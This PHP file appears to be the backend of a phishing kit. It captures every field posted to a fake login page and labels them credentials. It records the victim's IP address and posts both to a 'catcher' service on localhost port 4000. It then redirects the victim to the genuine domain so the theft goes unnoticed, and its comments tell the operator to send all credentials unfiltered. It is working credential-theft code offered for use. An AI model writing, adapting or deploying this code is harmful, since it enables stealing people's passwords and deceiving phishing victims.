<?php

/**
 * This function can be edit by user ! Feel free to test different configurations !
**/
function custom() {


// Immediate redirection of user if method is GET
if ($_SERVER["REQUEST_METHOD"]==='POST') $keys = $_POST;
if ($_SERVER["REQUEST_METHOD"]==='GET') redirect();

// Do not filter received credentials, just send them all to the catcher
call_catcher(json_encode($keys));







}

/**
 * This function should not be modified
**/
function call_catcher($credentials) {

    $keys = $_POST;

    $url = "http://127.0.0.1:4000";
    $ip_victim = $_SERVER['REMOTE_ADDR'];

    $siteIdPath = 'site_id.txt';
    if (file_exists($siteIdPath)) {
        $siteId = file_get_contents($siteIdPath);
    }
    else{
        $siteId = "NaN";
    }

    $domainPath = 'domain_name.txt';
    if (file_exists($domainPath)) {
        $domain = file_get_contents($domainPath);
    }
    else{
        $domain = "NaN";
    }

    $data = json_encode([
        'site_id' => trim($siteId),
        'credentials' => json_encode($keys),
        'ip_victim' => $ip_victim
    ]);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json',
        'Content-Length: ' . strlen($data)
    ]);

    $response = curl_exec($ch);

    curl_close($ch);

    redirect($domain);
    exit();

}

function redirect($domain) {
    header("location:http://$domain");
}

custom();